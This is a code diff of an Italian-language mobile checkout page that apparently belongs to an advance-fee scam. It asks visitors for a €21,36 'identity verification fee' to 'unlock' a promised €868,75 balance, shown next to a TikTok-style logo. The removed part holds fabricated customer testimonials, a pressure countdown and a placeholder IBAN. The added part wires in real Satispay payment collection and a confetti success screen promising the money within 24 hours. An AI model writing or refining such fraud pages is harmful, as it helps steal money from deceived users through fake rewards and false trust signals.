@@ -7,8 +7,8 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f2f2f2;max-width:420px;margin:0 auto;min-height:100vh;-webkit-font-smoothing:antialiased}
-.topbar{background:#ff2d55;color:white;text-align:center;padding:12px 16px;font-size:14px;font-weight:600}
-.container{padding:12px 12px 48px;display:flex;flex-direction:column;gap:10px}
+.topbar{background:#ff2d55;color:white;text-align:center;padding:12px 16px;font-size:14px;font-weight:600;letter-spacing:.3px}
+.container{padding:12px 12px 56px;display:flex;flex-direction:column;gap:10px}
 .saldo-card{background:#1c1c1e;border-radius:14px;padding:20px 18px;color:white}
 .saldo-label{font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:rgba(255,255,255,.5);margin-bottom:8px}
 .saldo-value{font-size:42px;font-weight:800;letter-spacing:-1px;margin-bottom:6px;line-height:1}
@@ -27,23 +27,26 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
 .card-header h2{font-size:17px;font-weight:700;color:#111}
 .field{margin-bottom:12px}
 .field:last-child{margin-bottom:0}
-.field label{display:block;font-size:13px;color:#555;margin-bottom:6px}
+.field label{display:block;font-size:13px;color:#555;margin-bottom:6px;font-weight:500}
 .field input{width:100%;padding:13px 14px;border:1px solid #e0e0e0;border-radius:8px;font-size:15px;font-family:inherit;color:#111;background:#fff;outline:none;transition:border-color .2s}
 .field input:focus{border-color:#ff2d55;box-shadow:0 0 0 3px rgba(255,45,85,.1)}
 .field input::placeholder{color:#bbb}
-.field input.error{border-color:#ff2d55;box-shadow:0 0 0 3px rgba(255,45,85,.1);animation:shake .3s ease}
+.field input.error{border-color:#ff2d55;animation:shake .3s ease}
 .field-error-msg{font-size:11px;color:#ff2d55;font-weight:600;margin-top:4px;display:none}
 .field input.error + .field-error-msg{display:block}
 @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
-.btn-pagar{display:flex;width:100%;padding:16px;background:#ff2d55;color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;font-family:inherit;letter-spacing:.5px;cursor:pointer;text-align:center;text-transform:uppercase;margin-bottom:10px;transition:background .15s;align-items:center;justify-content:center;gap:10px}
-.btn-pagar:hover{background:#e8003d}
-.btn-pagar:active{background:#cc0033}
-.btn-pagar.loading{background:#cc1f3f;cursor:not-allowed;pointer-events:none}
+.satispay-info{display:flex;align-items:center;gap:10px;background:#f8f8f8;border:1px solid #eee;border-radius:10px;padding:12px 14px;margin-bottom:14px}
+.satispay-logo{font-size:24px}
+.satispay-desc strong{display:block;font-size:14px;color:#111;margin-bottom:1px}
+.satispay-desc span{font-size:12px;color:#888}
+.btn-pagar{display:flex;width:100%;padding:16px;background:#e3002e;color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;font-family:inherit;letter-spacing:.5px;cursor:pointer;text-align:center;text-transform:uppercase;transition:background .15s;align-items:center;justify-content:center;gap:10px}
+.btn-pagar:hover{background:#c50028}
+.btn-pagar:active{background:#a8001f}
+.btn-pagar.loading{background:#9e001a;cursor:not-allowed;pointer-events:none}
 .spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:white;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
 .btn-pagar.loading .spinner{display:block}
 @keyframes spin{to{transform:rotate(360deg)}}
-.pay-note{text-align:center;font-size:12.5px;color:#888}
-.pay-note strong{color:#111}
+.pay-note{text-align:center;font-size:12px;color:#888;line-height:1.5;margin-top:8px}
 .seals{background:#fff;border-radius:14px;padding:14px 16px;display:flex;align-items:center;justify-content:center}
 .seal{display:flex;flex-direction:column;align-items:center;gap:5px;flex:1}
 .seal-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center}
@@ -51,48 +54,35 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
 .seal-text{font-size:10.5px;font-weight:700;color:#555;text-align:center;line-height:1.3}
 .seal-divider{width:1px;height:40px;background:#f0f0f0;flex-shrink:0}
 .footer-note{text-align:center;font-size:12px;color:#aaa;padding:0 8px;line-height:1.6}
-.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.55);display:flex;align-items:flex-end;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:opacity .25s ease}
-.modal-overlay.active{opacity:1;pointer-events:all}
-.modal{background:#fff;border-radius:20px 20px 0 0;padding:28px 22px 36px;width:100%;max-width:480px;position:relative;text-align:center;transform:translateY(100%);transition:transform .3s cubic-bezier(.32,.72,0,1);overflow-y:auto;max-height:92vh}
-.modal-overlay.active .modal{transform:translateY(0)}
-.modal-handle{width:40px;height:4px;background:#e0e0e0;border-radius:4px;margin:0 auto 18px}
-.modal-close{position:absolute;top:14px;right:16px;width:28px;height:28px;background:#f2f2f2;border:none;border-radius:50%;cursor:pointer;font-size:16px;color:#888}
-.modal-check{width:52px;height:52px;border-radius:50%;border:2.5px solid #00b37e;display:flex;align-items:center;justify-content:center;margin:0 auto 10px}
-.modal-title{font-size:18px;font-weight:800;color:#111;margin-bottom:2px}
-.modal-subtitle{font-size:13px;color:#888;margin-bottom:16px}
-.modal-value{font-size:22px;font-weight:800;color:#111;margin-bottom:18px}
-.timer-wrap{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px}
-.timer-label{font-size:12px;color:#999}
-.timer-count{font-size:20px;font-weight:800;color:#00b37e;font-variant-numeric:tabular-nums}
-.timer-count.urgent{color:#e63946}
-.timer-bar-wrap{width:100%;height:4px;background:#f0f0f0;border-radius:4px;margin-bottom:16px;overflow:hidden}
-.timer-bar{height:100%;background:#00b37e;border-radius:4px;transition:width 1s linear,background .3s}
-.timer-bar.urgent{background:#e63946}
-.how-to-copy{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
-.how-step-row{display:flex;align-items:center;gap:10px}
-.how-step-num{width:24px;height:24px;border-radius:50%;background:#f0faf6;border:1.5px solid #c8edd9;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#00b37e;flex-shrink:0}
-.how-step-desc{font-size:12.5px;color:#555;font-weight:500;line-height:1.35}
-.how-step-desc strong{color:#111}
-.iban-code-row{display:flex;align-items:center;gap:8px;background:#f8f8f8;border:1px solid #eee;border-radius:8px;padding:10px 12px;margin-bottom:14px}
-.iban-code-text{flex:1;font-size:12px;color:#555;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:left;font-family:monospace}
-.copy-btn{background:none;border:none;cursor:pointer;color:#888;padding:2px;flex-shrink:0;transition:color .15s}
-.copy-btn:hover{color:#00b37e}
-.btn-copiar{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:15px;background:#00b37e;color:white;border:none;border-radius:10px;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;margin-bottom:10px;transition:background .15s}
-.btn-copiar:hover{background:#009e6e}
-.btn-copiar.copied{background:#057a55}
-.mini-depos{display:flex;flex-direction:column;gap:5px;margin:10px 0 8px}
-.mini-depo{display:flex;align-items:center;gap:8px;background:#f8f8f8;border-radius:8px;padding:8px 10px}
-.mini-depo-av{width:28px;height:28px;border-radius:50%;font-size:10px;font-weight:700;color:white;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.mini-depo-text{flex:1;font-size:12.5px;color:#444;font-style:italic;line-height:1.4}
-.mini-depo-check{font-size:11px;font-weight:700;color:#00b37e;white-space:nowrap;flex-shrink:0}
-.modal-note{font-size:11.5px;color:#aaa;line-height:1.5}
 #toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-120px);background:#1a1a2e;color:white;padding:14px 20px;border-radius:12px;font-size:14px;font-weight:600;z-index:999999;transition:transform .3s ease;display:flex;align-items:center;gap:8px;box-shadow:0 6px 24px rgba(0,0,0,.3);width:calc(100% - 32px);max-width:388px}
 #toast.show{transform:translateX(-50%) translateY(0)}
+.poll-overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);z-index:9999;display:none;align-items:center;justify-content:center}
+.poll-overlay.active{display:flex}
+.poll-box{background:#fff;border-radius:20px;padding:32px 24px;width:88%;max-width:360px;text-align:center}
+.poll-icon{font-size:48px;margin-bottom:14px;animation:pulse-ic 1.2s ease infinite}
+@keyframes pulse-ic{0%,100%{transform:scale(1)}50%{transform:scale(1.12)}}
+.poll-title{font-size:18px;font-weight:800;color:#111;margin-bottom:6px}
+.poll-sub{font-size:13px;color:#888;margin-bottom:20px;line-height:1.5}
+.poll-dots{display:flex;justify-content:center;gap:8px}
+.poll-dot{width:10px;height:10px;border-radius:50%;background:#e3002e;animation:dotpulse 1.2s ease-in-out infinite}
+.poll-dot:nth-child(2){animation-delay:.2s}
+.poll-dot:nth-child(3){animation-delay:.4s}
+@keyframes dotpulse{0%,80%,100%{opacity:.3;transform:scale(.8)}40%{opacity:1;transform:scale(1)}}
+.success-overlay{position:fixed;inset:0;background:linear-gradient(135deg,#00b37e,#007a55);z-index:99999;display:none;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:32px}
+.success-overlay.active{display:flex}
+.success-check{width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;animation:pop-in .4s ease}
+@keyframes pop-in{from{transform:scale(.4);opacity:0}to{transform:scale(1);opacity:1}}
+.success-title{font-size:26px;font-weight:900;color:#fff;margin-bottom:8px}
+.success-sub{font-size:15px;color:rgba(255,255,255,.8);margin-bottom:4px;line-height:1.5}
+.success-amount{font-size:48px;font-weight:900;color:#fff;margin:16px 0}
+.success-note{font-size:13px;color:rgba(255,255,255,.65);line-height:1.6}
 </style>
 </head>
 <body>
-<div id="toast"><span id="toastMsg">Compila tutti i campi per continuare</span></div>
-<div class="topbar">Pagamento Sicuro e Veloce</div>
+<div id="toast"><span id="toastMsg"></span></div>
+
+<div class="topbar">🔒 Pagamento Sicuro con Satispay</div>
+
 <div class="container">
 
   <div class="saldo-card">
@@ -108,13 +98,13 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
         <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.22 8.22 0 004.84 1.56V6.79a4.85 4.85 0 01-1.07-.1z"/></svg>
       </div>
       <div>
-        <p class="confirm-name">Quota di Verifica</p>
-        <p class="confirm-price" id="priceConfirm">€ 21,00</p>
+        <p class="confirm-name">Quota di Verifica Identità</p>
+        <p class="confirm-price" id="priceConfirm">€ 21,36</p>
       </div>
     </div>
     <div class="total-row">
       <span class="total-label">Totale:</span>
-      <span class="total-value" id="priceTotal">€ 21,00</span>
+      <span class="total-value" id="priceTotal">€ 21,36</span>
     </div>
     <div class="libera-badge">✅ Paga e sblocca immediatamente <strong id="saldoBadge">€868,75</strong></div>
   </div>
@@ -124,7 +114,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
       <div class="card-header-icon">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
       </div>
-      <h2>Identificati</h2>
+      <h2>I tuoi dati</h2>
     </div>
     <div class="field">
       <label>Nome completo</label>
@@ -143,13 +133,22 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
       <div class="card-header-icon">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
       </div>
-      <h2>Pagamento</h2>
+      <h2>Metodo di pagamento</h2>
     </div>
+
+    <div class="satispay-info">
+      <span class="satispay-logo">🔴</span>
+      <div class="satispay-desc">
+        <strong>Satispay</strong>
+        <span>Il metodo di pagamento italiano sicuro e veloce</span>
+      </div>
+    </div>
+
     <button class="btn-pagar" id="btnPagar">
       <div class="spinner"></div>
-      <span class="btn-text">Paga Ora</span>
+      <span class="btn-text">Paga con Satispay</span>
     </button>
-    <p class="pay-note">Pagamento sicuro via <strong>Bonifico / SEPA</strong> con approvazione immediata.</p>
+    <p class="pay-note">Verrai reindirizzato all'app Satispay per confermare il pagamento.<br>Sicuro · Nessuna commissione · Immediato</p>
   </div>
 
   <div class="seals">
@@ -160,44 +159,28 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
     <div class="seal"><div class="seal-icon amber"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div><span class="seal-text">Rimborso<br>7 giorni</span></div>
   </div>
 
-  <p class="footer-note">Acquisto 100% sicuro. Rimborso garantito entro 7 giorni.</p>
+  <p class="footer-note">Acquisto 100% sicuro. I tuoi dati sono protetti con crittografia SSL.</p>
 </div>
 
-<!-- Modal pagamento -->
-<div class="modal-overlay" id="pixModal">
-  <div class="modal">
-    <div class="modal-handle"></div>
-    <button class="modal-close" id="modalClose">✕</button>
-    <div class="modal-check">
-      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-    </div>
-    <h2 class="modal-title">Pagamento Generato!</h2>
-    <p class="modal-subtitle" id="modalSubtitle">Ciao, <strong id="nomeModal">–</strong>! Copia il codice IBAN qui sotto.</p>
-    <p class="modal-value" id="priceModal">€ 21,00</p>
-    <div class="timer-wrap">
-      <span class="timer-label">Tempo rimasto:</span>
-      <span class="timer-count" id="timerCount">10:00</span>
-    </div>
-    <div class="timer-bar-wrap"><div class="timer-bar" id="timerBar" style="width:100%"></div></div>
-    <div class="how-to-copy">
-      <div class="how-step-row"><div class="how-step-num">1</div><p class="how-step-desc">Apri l'app della tua banca e vai su <strong>Bonifico</strong></p></div>
-      <div class="how-step-row"><div class="how-step-num">2</div><p class="how-step-desc">Scegli <strong>Trasferimento SEPA</strong></p></div>
-      <div class="how-step-row"><div class="how-step-num">3</div><p class="how-step-desc">Clicca su <strong>Copia Codice IBAN</strong> qui sotto e incollalo nella tua banca</p></div>
-      <div class="how-step-row"><div class="how-step-num">4</div><p class="how-step-desc">Verifica l'importo di <strong id="priceStep">€ 21,00</strong> e conferma</p></div>
-    </div>
-    <div class="iban-code-row">
-      <span class="iban-code-text" id="ibanCodeText">Generazione codice...</span>
-      <button class="copy-btn" id="copyCodeBtn" title="Copia codice">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
-      </button>
-    </div>
-    <button class="btn-copiar" id="btnCopiar">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
-      Copia Codice IBAN
-    </button>
-    <div class="mini-depos" id="miniDepos"></div>
-    <p class="modal-note">Dopo il pagamento riceverai la conferma immediatamente su questo dispositivo.</p>
+<!-- Aguardando confirmação Satispay -->
+<div class="poll-overlay" id="pollOverlay">
+  <div class="poll-box">
+    <div class="poll-icon">📱</div>
+    <h3 class="poll-title">Conferma su Satispay</h3>
+    <p class="poll-sub">Apri l'app Satispay e accetta la richiesta di pagamento.<br>Aspettiamo la tua conferma…</p>
+    <div class="poll-dots"><div class="poll-dot"></div><div class="poll-dot"></div><div class="poll-dot"></div></div>
   </div>
+</div>
+
+<!-- Sucesso -->
+<div class="success-overlay" id="successOverlay">
+  <div class="success-check">
+    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+  </div>
+  <h2 class="success-title">Pagamento Confermato! 🎉</h2>
+  <p class="success-sub">La tua quota di verifica è stata ricevuta.<br>Il tuo saldo è stato sbloccato:</p>
+  <div class="success-amount" id="successAmount">€868,75</div>
+  <p class="success-note">Riceverai una conferma via e-mail.<br>Il trasferimento sarà elaborato entro 24 ore lavorative.</p>
 </div>
 
 <script>
@@ -209,122 +192,194 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
   function fmt(v){ return '€ ' + v.toFixed(2).replace('.',','); }
   function fmtS(v){ return '€' + v.toFixed(2).replace('.',','); }
 
-  document.getElementById('saldoValue').textContent   = fmtS(totalParam);
-  document.getElementById('saldoBadge').textContent   = fmtS(totalParam);
-  document.getElementById('priceConfirm').textContent = fmt(taxaParam);
-  document.getElementById('priceTotal').textContent   = fmt(taxaParam);
-  document.getElementById('priceModal').textContent   = fmt(taxaParam);
-  document.getElementById('priceStep').textContent    = fmt(taxaParam);
+  document.getElementById('saldoValue').textContent    = fmtS(totalParam);
+  document.getElementById('saldoBadge').textContent    = fmtS(totalParam);
+  document.getElementById('priceConfirm').textContent  = fmt(taxaParam);
+  document.getElementById('priceTotal').textContent    = fmt(taxaParam);
+  document.getElementById('successAmount').textContent = fmtS(totalParam);
 
-  var allDepos = [
-    {av:'GL',bg:'#e05252',txt:'"Arrivato sul mio conto in meno di 2 minuti."'},
-    {av:'MR',bg:'#00b37e',txt:'"Processo semplice e sicuro. Consigliato!"'},
-    {av:'SF',bg:'#5a6fd6',txt:'"Ha funzionato perfettamente al primo tentativo."'},
-    {av:'AP',bg:'#f59e0b',txt:'"Velocissimo, lo consiglio a tutti."'},
-    {av:'LC',bg:'#8b5cf6',txt:'"Nessun problema, pagamento confermato subito."'},
-    {av:'VB',bg:'#ec4899',txt:'"Procedura semplice e sicura. Approvato!"'},
-  ];
-
-  function renderDepos(){
-    var shuffled = allDepos.sort(function(){ return Math.random()-.5; }).slice(0,3);
-    document.getElementById('miniDepos').innerHTML = shuffled.map(function(d){
-      return '<div class="mini-depo"><div class="mini-depo-av" style="background:'+d.bg+'">'+d.av+'</div>'+
-             '<span class="mini-depo-text">'+d.txt+'</span>'+
-             '<span class="mini-depo-check">✅ Confermato</span></div>';
-    }).join('');
+  // Volta do redirect Satispay com ?payment=<id>&status=<status>
+  var returnPaymentId = params.get('payment');
+  var returnStatus    = params.get('status');
+  if(returnPaymentId){
+    if(returnStatus === 'paid'){
+      showSuccess();
+    } else {
+      startPolling(returnPaymentId);
+    }
   }
-  renderDepos();
 
-  // IBAN fittizio para demo (seria gerado por backend real)
-  var IBAN_CODE = 'IT60 X054 2811 1010 0000 00' + Math.floor(10000+Math.random()*89999);
-  var timerInterval = null;
-  var TOTAL_SECONDS = 10*60, remainingSeconds = TOTAL_SECONDS;
-
-  function pad(n){ return String(n).padStart(2,'0'); }
-
+  // ── Toast ────────────────────────────────────────────────────────────────
   var toastTimeout;
-  function showToast(msg){
-    var el=document.getElementById('toast');
-    document.getElementById('toastMsg').textContent=msg;
+  function showToast(msg, duration){
+    var el = document.getElementById('toast');
+    document.getElementById('toastMsg').textContent = msg;
     clearTimeout(toastTimeout);
     el.classList.remove('show');
-    setTimeout(function(){el.classList.add('show');toastTimeout=setTimeout(function(){el.classList.remove('show');},3000);},10);
+    setTimeout(function(){ el.classList.add('show'); }, 10);
+    toastTimeout = setTimeout(function(){ el.classList.remove('show'); }, duration || 3500);
   }
 
-  function startTimer(){
-    var countEl=document.getElementById('timerCount'),barEl=document.getElementById('timerBar');
-    remainingSeconds=TOTAL_SECONDS;
-    if(timerInterval) clearInterval(timerInterval);
-    timerInterval=setInterval(function(){
-      remainingSeconds--;
-      if(remainingSeconds<=0){remainingSeconds=0;clearInterval(timerInterval);}
-      var m=Math.floor(remainingSeconds/60),s=remainingSeconds%60;
-      countEl.textContent=pad(m)+':'+pad(s);
-      var urgent=remainingSeconds<300;
-      countEl.classList.toggle('urgent',urgent);barEl.classList.toggle('urgent',urgent);
-      barEl.style.width=(remainingSeconds/TOTAL_SECONDS*100)+'%';
-    },1000);
-  }
-
-  function openModal(nome){
-    document.getElementById('nomeModal').textContent = nome;
-    document.getElementById('ibanCodeText').textContent = IBAN_CODE;
-    document.getElementById('pixModal').classList.add('active');
-    document.body.classList.add('modal-open');
-    startTimer();
-  }
-
-  document.getElementById('modalClose').addEventListener('click', function(){
-    document.getElementById('pixModal').classList.remove('active');
-    document.body.classList.remove('modal-open');
-    if(timerInterval) clearInterval(timerInterval);
-  });
-
-  document.getElementById('copyCodeBtn').addEventListener('click', function(){
-    navigator.clipboard.writeText(IBAN_CODE).then(function(){
-      showToast('✅ Codice IBAN copiato!');
-    });
-  });
-
-  document.getElementById('btnCopiar').addEventListener('click', function(){
-    navigator.clipboard.writeText(IBAN_CODE).then(function(){
-      var btn=document.getElementById('btnCopiar');
-      btn.classList.add('copied');
-      btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Codice Copiato!';
-      showToast('✅ Codice IBAN copiato negli appunti!');
-      setTimeout(function(){
-        btn.classList.remove('copied');
-        btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copia Codice IBAN';
-      }, 3000);
-    });
-  });
-
-  document.getElementById('inputNome').addEventListener('blur', function(){
-    if(this.value.trim().length<2) this.classList.add('error'); else this.classList.remove('error');
-  });
-  document.getElementById('inputNome').addEventListener('focus', function(){ this.classList.remove('error'); });
-
-  document.getElementById('btnPagar').addEventListener('click', function(){
-    var nome=document.getElementById('inputNome');
-    var emailEl=document.getElementById('inputEmail');
-    nome.classList.remove('error'); emailEl.classList.remove('error');
-    var ok=true;
-    if(nome.value.trim().length<2){ nome.classList.add('error'); ok=false; }
-    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailEl.value.trim())){ emailEl.classList.add('error'); ok=false; }
+  // ── Validação ─────────────────────────────────────────────────────────────
+  function validateFields(){
+    var nome  = document.getElementById('inputNome');
+    var email = document.getElementById('inputEmail');
+    nome.classList.remove('error'); email.classList.remove('error');
+    var ok = true;
+    if(nome.value.trim().length < 2){ nome.classList.add('error');  ok = false; }
+    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value.trim())){ email.classList.add('error'); ok = false; }
     if(!ok){
       showToast('📋 Compila tutti i campi correttamente');
-      document.querySelector('.field input.error').scrollIntoView({behavior:'smooth',block:'center'});
+      var first = document.querySelector('.field input.error');
+      if(first) first.scrollIntoView({behavior:'smooth', block:'center'});
+    }
+    return ok;
+  }
+
+  document.getElementById('inputNome').addEventListener('focus',  function(){ this.classList.remove('error'); });
+  document.getElementById('inputEmail').addEventListener('focus', function(){ this.classList.remove('error'); });
+
+  // ── Criar pagamento ───────────────────────────────────────────────────────
+  document.getElementById('btnPagar').addEventListener('click', function(){
+    if(!validateFields()) return;
+
+    var btn = document.getElementById('btnPagar');
+    btn.classList.add('loading');
+    btn.querySelector('.btn-text').textContent = 'Generazione pagamento…';
+
+    var nome  = document.getElementById('inputNome').value.trim();
+    var email = document.getElementById('inputEmail').value.trim();
+
+    // return_url: a API substituirá {payment} e {status} automaticamente
+    var base = window.location.href.split('?')[0];
+    var returnUrl = base +
+      '?total=' + totalParam.toFixed(2) +
+      '&taxa='  + taxaParam.toFixed(2) +
+      (params.get('src') ? '&src=' + params.get('src') : '') +
+      '&payment={payment}&status={status}';
+
+    fetch('/api/criar-pagamento', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        amount:             taxaParam,
+        name:               nome,
+        email:              email,
+        external_reference: 'ita-' + Date.now(),
+        return_url:         returnUrl,
+      }),
+    })
+    .then(function(r){ return r.json().then(function(d){ return { ok: r.ok, status: r.status, data: d }; }); })
+    .then(function(res){
+      btn.classList.remove('loading');
+      btn.querySelector('.btn-text').textContent = 'Paga con Satispay';
+
+      if(!res.ok){
+        var msg = (res.data && res.data.message) ? res.data.message : 'Errore. Riprova tra qualche istante.';
+        showToast('❌ ' + msg, 5000);
+        return;
+      }
+
+      var payment    = res.data;
+      var nextAction = payment.next_action;
+
+      if(nextAction && nextAction.type === 'redirect' && nextAction.url){
+        // Fluxo padrão Satispay: redireciona para a URL de pagamento
+        showToast('🔴 Reindirizzamento a Satispay…');
+        setTimeout(function(){ window.location.href = nextAction.url; }, 700);
+
+      } else if(nextAction && (nextAction.type === 'mbway' || nextAction.type === 'bizum')){
+        // Push para o app — polling
+        showToast('📱 Richiesta inviata all\'app!');
+        startPolling(payment.id);
+
+      } else {
+        // Sem next_action (confirmação imediata) ou tipo desconhecido — polling
+        startPolling(payment.id);
+      }
+    })
+    .catch(function(err){
+      btn.classList.remove('loading');
+      btn.querySelector('.btn-text').textContent = 'Paga con Satispay';
+      showToast('❌ Errore di rete. Controlla la connessione e riprova.', 4500);
+      console.error('[checkout] fetch error:', err);
+    });
+  });
+
+  // ── Polling ───────────────────────────────────────────────────────────────
+  var pollInterval = null;
+  var pollAttempts = 0;
+  var MAX_POLL = 60; // 5 min (60 × 5 s)
+
+  function startPolling(paymentId){
+    document.getElementById('pollOverlay').classList.add('active');
+    pollAttempts = 0;
+    if(pollInterval) clearInterval(pollInterval);
+    checkStatus(paymentId); // imediato
+    pollInterval = setInterval(function(){ checkStatus(paymentId); }, 5000);
+  }
+
+  function checkStatus(paymentId){
+    if(++pollAttempts > MAX_POLL){
+      clearInterval(pollInterval);
+      document.getElementById('pollOverlay').classList.remove('active');
+      showToast('⏰ Tempo scaduto. Contatta il supporto se hai già pagato.', 6000);
       return;
     }
-    var btn=document.getElementById('btnPagar');
-    btn.classList.add('loading');
-    btn.querySelector('.btn-text').textContent='Generazione pagamento...';
-    setTimeout(function(){
-      btn.classList.remove('loading');
-      btn.querySelector('.btn-text').textContent='Paga Ora';
-      openModal(nome.value.trim());
-    }, 1200);
-  });
+    fetch('/api/status-pagamento?id=' + encodeURIComponent(paymentId))
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if(data.status === 'paid'){
+        clearInterval(pollInterval);
+        document.getElementById('pollOverlay').classList.remove('active');
+        showSuccess();
+      } else if(data.status === 'failed'){
+        clearInterval(pollInterval);
+        document.getElementById('pollOverlay').classList.remove('active');
+        showToast('❌ Pagamento rifiutato. Riprova o contatta il supporto.', 6000);
+      }
+      // 'pending' → continua
+    })
+    .catch(function(){ /* rede instável — continua tentando */ });
+  }
+
+  // ── Sucesso ───────────────────────────────────────────────────────────────
+  function showSuccess(){
+    clearInterval(pollInterval);
+    document.getElementById('pollOverlay').classList.remove('active');
+    document.getElementById('successOverlay').classList.add('active');
+    spawnConfetti();
+  }
+
+  function spawnConfetti(){
+    var cv = document.createElement('canvas');
+    cv.style.cssText = 'position:fixed;inset:0;pointer-events:none;z-index:999998';
+    document.body.appendChild(cv);
+    cv.width = window.innerWidth; cv.height = window.innerHeight;
+    var ctx = cv.getContext('2d');
+    var cols = ['#ffffff','#ff4d67','#00b37e','#f59e0b','#60a5fa'];
+    var pts = Array.from({length:50}, function(){
+      return {
+        x:Math.random()*cv.width, y:Math.random()*-cv.height,
+        w:5+Math.random()*6, h:4+Math.random()*4,
+        rot:Math.random()*360, rs:-5+Math.random()*10,
+        vx:-1+Math.random()*2, vy:2+Math.random()*3,
+        col:cols[Math.floor(Math.random()*cols.length)]
+      };
+    });
+    (function draw(){
+      ctx.clearRect(0,0,cv.width,cv.height);
+      var alive=false;
+      pts.forEach(function(p){
+        p.vy=Math.min(p.vy+.12,4);p.x+=p.vx;p.y+=p.vy;p.rot+=p.rs;
+        if(p.y<cv.height*1.1)alive=true;
+        ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot*Math.PI/180);
+        ctx.globalAlpha=.9;ctx.fillStyle=p.col;
+        ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();
+      });
+      if(alive)requestAnimationFrame(draw);else cv.remove();
+    })();
+  }
 })();
 </script>
 </body>
